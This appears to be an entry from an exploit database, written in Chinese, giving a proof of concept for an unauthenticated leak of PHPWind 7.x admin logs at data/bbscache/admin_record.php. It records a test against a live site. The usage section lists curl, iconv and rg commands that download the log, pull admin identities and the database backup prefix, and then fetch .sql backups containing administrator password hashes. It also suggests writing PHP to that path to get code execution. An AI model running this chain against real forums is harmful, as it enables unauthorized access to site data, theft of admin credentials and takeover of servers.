# PHPWind 后台操作日志 data/bbscache/admin_record.php 零鉴权直读（含真实 adminjob 模块与 bakup 备份前缀）

- **code**: phpwind-后台操作日志-data-bbscache-admin_record.php-零鉴权直读-含真实-admi
- **kind**: poc
- **category**: info-leak
- **component**: PHPWind 7.x (7.3.2/7.5)
- **versions**: PHPWind 7.x（PostLog/adminlog 模块）
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-19 在 https://example.com 实测：无 Cookie GET /data/bbscache/admin_record.php 返回 200，完整下载 28,726,269B、10,978 行（GBK），时间跨度 2021-01-04~2026-10-03；提取到 uid=1 管理员（email admin@admin.com）、45 个 adminjob 模块、备份前缀 pre=pw_0404_97e3f04329_（表含 pw_administrators）；带唯一 marker 的访客请求后全文零命中，确认不记录访客字段。
- **tags**: phpwind,postlog,adminlog,info-leak,backup-prefix,unauthorized
- **created_at**: 2026-10-19T05:49:20.812Z
- **found_by**: work

## 描述

PHPWind 将后台操作日志 PostLog 写到 data/bbscache/admin_record.php（GBK 纯文本，无 exit/PHP 标签），未加访问守卫时可免认证整份下载。格式：|用户名||/example.com?...|IP|10位时间戳|POST字段摘要|；只记录已认证管理员的后台请求，不记录 UA/Referer/Cookie/原始 body，password 被 *** 掩码。情报价值：枚举真实 adminjob 模块、管理员 uid/用户名/邮箱/常用IP/操作时序；adminjob=bakup&admintype=bakout 记录泄露全库备份前缀 pre=pw_MMDD_<10hex>_ 与表清单（含 pw_administrators），可直接引导备份文件取回。

## 用法

```
1) curl -k -A "$ARTEX_UA" -o admin_record.log "https://TARGET/data/bbscache/admin_record.php"（文件可能数十 MB，Range 常被忽略，需完整下载）；
2) iconv -f GBK -t UTF-8 admin_record.log > log.txt（或用 [Text.Encoding]::GetEncoding(936) 解码）；
3) grep -aiE '\|17[5-9][0-9]{7}\|' 取近期记录；rg -o 'adminjob=[a-zA-Z0-9_]+' | sort -u 得真实后台模块；rg -o 'pre=pw_[0-9]{4}_[0-9a-f]{10}_' 得备份前缀，再到 data/backup、data/mysqlbak 等取回 .sql 拿 pw_administrators 哈希；
4) 日志注入不可免登录利用：访客 marker 不落盘，只有认证后台操作才写入；但该路径是 .php 落点，任何其它写点（SQL INTO OUTFILE / 后台写配置）向它写 PHP 即执行。
```
